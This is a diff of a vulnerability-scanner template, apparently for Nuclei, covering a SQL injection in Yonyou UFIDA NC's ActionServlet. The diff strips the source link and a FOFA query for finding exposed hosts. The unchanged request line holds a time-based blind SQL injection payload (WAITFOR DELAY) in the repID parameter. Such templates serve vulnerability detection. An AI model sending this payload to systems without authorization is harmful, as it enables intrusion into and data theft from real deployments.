@@ -3,12 +3,8 @@ info:
   name: 用友NC-com.ufida.web.action.ActionServlet SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ui543gy90sdlpx6q'
+  description: ''
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ui543gy90sdlpx6q
-    fofa: app="用友-UFIDA-NC"
 http:
 - raw:
   - 'GET /service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iuforeport.rep.FormulaViewAction&method=execute&repID=1'')%20WAITFOR%20DELAY%20''0:0:5''--+&unitID=public HTTP/1.1
